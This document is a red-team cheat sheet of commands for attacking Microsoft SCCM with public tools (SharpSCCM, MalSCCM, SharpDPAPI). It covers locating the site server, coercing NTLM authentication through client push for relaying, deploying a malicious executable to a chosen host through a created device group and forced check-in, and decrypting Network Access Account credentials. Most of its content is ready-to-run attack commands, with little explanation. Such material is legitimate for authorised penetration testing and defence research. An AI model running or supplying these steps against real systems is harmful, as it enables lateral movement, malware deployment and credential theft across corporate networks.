### Sources
https://github.com/Mayyhem/SharpSCCM, 
https://github.com/PowerShellMafia/PowerSCCM - a bit outdated but still valid,
https://github.com/nettitude/MalSCCM,
https://github.com/GhostPack/SharpDPAPI 

### Identify SCCM server on local machine

```
SharpSCCM.exe local siteinfo
```

```
MalSCCM.exe locate 
```

Those commands provide the responsible SCCM Server for the client and the site. Those are prerequisites for any furhter attacks.

### Verify SCCM configuration

```
MalSCCM.exe inspect /all /server:<PrimarySiteFQDN>
```

### Initiate Client Push (for relaying)

```
SharpSCCM.exe <server> <sitecode> invoke client-push -t "<windows_host_netbios_name>@445"
```
Details on relaying setup - https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a, 
Additional relaying hints - https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867 

### Deploy malicous application by SCCM - ATTENTION - permissions within SCCM Infrastructure required - potential impact on target infrastructure

Create new group for deployment
```
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
```

Add target computer to group
```
MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
```

Add application
```
MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
```

Deploy the application to the target group 
```
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
```

Initiate checkin - which will trigger the installation as soon as possible
```
MalSCCM.exe checkin /groupname:TargetGroup
```

https://labs.nettitude.com/blog/introducing-malsccm/ 


### NAA Accounts

In case an NAA Account has been deployed or used it can be decrypted on the local client
```
SharpDPAPI.exe sccm
```

ATTENTION - local admin privileges are required -
https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
